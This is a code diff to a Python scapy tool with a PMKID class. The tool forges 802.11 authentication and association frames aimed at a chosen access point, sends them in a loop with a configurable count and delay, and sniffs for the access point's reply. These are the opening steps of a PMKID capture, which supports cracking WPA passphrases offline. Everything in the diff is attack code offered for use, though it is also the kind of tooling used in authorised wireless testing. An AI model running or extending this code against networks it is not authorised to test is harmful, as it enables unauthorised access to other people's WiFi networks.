@@ -26,12 +26,14 @@ from scapy.layers.dot11 import Dot11Auth
 from scapy.layers.dot11 import Dot11AssoReq
 from scapy.layers.eap   import EAPOL
 
+pull = PULL()
+
 class PMKID:
 
 	__AUTHRUNNER = True
 	__AUTHSTATUS = True
 
-	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname):
+	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname, pauth, passo, delay):
 		self.interface  = iface
 		self.bssid      = bssid
 		self.essid      = essid
@@ -44,6 +46,9 @@ class PMKID:
 		self.stations   = stations
 		self.beacon     = beacon
 		self.output     = self.output(outfname)
+		self.pauth      = pauth
+		self.passo      = passo
+		self.delay      = delay
 
 	def output(self, fl):
 		if fl:
@@ -55,6 +60,16 @@ class PMKID:
 				return (fl + ".pmkid")
 		else:
 			return False
+
+	def extract_sn_rc(self, pkt):
+		try:
+			sn = pkt.getlayer(Dot11FCS).addr2
+			rc = pkt.getlayer(Dot11FCS).addr1
+		except:
+			sn = pkt.getlayer(Dot11).addr2
+			rc = pkt.getlayer(Dot11).addr1
+
+		return (sn, rc)
 
 	def channeler(self):
 		ch = str(self.channel)
@@ -107,16 +122,58 @@ class PMKID:
 		while self.__AUTHRUNNER:
 			sendp(
 				pkt,
-				count=
+				count=self.pauth,
+				delay=self.delay
 			)
 
+			pull.print(
+				"*",
+				"Authentication Req. Count [{packets}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+					packets=pull.RED+str(self.pauth)+pull.END,
+					apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
+					ap=self.bssid.upper(),
+					stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
+					sta=self.myaddress.upper(),
+					essid=pull.YELLOW+self.essid+pull.END
+				),
+				pull.YELLOW
+			)
+
+		self.__AUTHSTATUS = False
+
+	def auth_receiver(self, pkt):
+		if pkt.haslayer(Dot11Auth):
+			retval = self.extract_sn_rc(pkt)
+			sn     = retval[0]
+			rc     = retval[1]
+
+			if sn == self.bssid and rc == self.myaddress:
+				pull.print(
+					"$",
+					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+						status=pull.GREEN+"Confirmed!"+pull.END,
+						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
+						ap=self.bssid.upper(),
+						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
+						sta=self.myaddress.upper(),
+						essid=pull.YELLOW+self.essid+pull.END
+					),
+					pull.GREEN
+				)
+				raise KeyboardInterrupt()
+
 	def engage(self):
-		myaddress  = self.get_my_address()
-		auth_frame = self.forge_auth_frame( self.bssid, myaddress )
-		asso_frame = self.forge_asso_frame( self.bssid, myaddress )
+		self.myaddress  = self.get_my_address()
+		auth_frame = self.forge_auth_frame( self.bssid, self.myaddress )
+		asso_frame = self.forge_asso_frame( self.bssid, self.myaddress )
 
 		t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
 		t.daemon = True
 		t.start()
 
 		sniff(iface=self.interface, prn=self.auth_receiver)
+
+		self.__AUTHRUNNER = False
+		while self.__AUTHSTATUS:
+			pass
+
